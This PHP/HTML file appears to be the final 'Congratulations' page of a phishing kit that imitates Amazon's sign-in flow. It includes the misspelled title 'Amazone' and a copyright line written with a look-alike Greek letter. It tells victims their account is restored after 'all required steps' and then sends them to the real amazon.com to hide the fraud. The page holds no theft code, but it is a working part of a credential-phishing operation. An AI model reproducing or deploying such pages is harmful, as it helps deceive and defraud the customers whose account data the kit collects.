<?php

session_start();

include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Sheets/index.css">
    <link rel="stylesheet" href="Sheets/thanks.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <title>Congratulations - Amazone</title>
</head>
<body>
    <!-- Logo Navbar-->
    <a href="#" class="navbrand text-center mt-3">
        <span class="aicon alogo"></span>
    </a>

    <div class="form">
        <div class="container-fluid">
            <div class="myform">
                <div class="level-complete text-center align-middle">
                    <i class=" fas fa-check myiconfa fa-3x"></i>
                </div>
                <h1 class="colorblacked text-center mt-3">Congratulations !</h1>
            
                <p class="text-center thankstext">Now You can access to your account , thanks for completing all required steps .</p>

                <a href="https://www.amazon.com/"><button type="submit" class="btn bgcolored mt-6px">Continue</button></a>
          
            </div>
        </div>
    </div>

    <div class="myhr"></div>

    <div class="footer">
        <ul class="nav  justify-content-center">
            <li class="nav-item">
              <a class="nav-link mylinke" href="#">Conditions of Use</a>
            </li>
            <li class="nav-item">
              <a class="nav-link mylinke" href="#">Privacy Notice</a>
            </li>
            <li class="nav-item">
                <a class="nav-link mylinke" href="#">Help</a>
            </li>
        </ul>
        <p class="footertext text-center">© 1996- 2018, Αmazon. com, Inc. or its affiliates</p>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>
</body>
</html>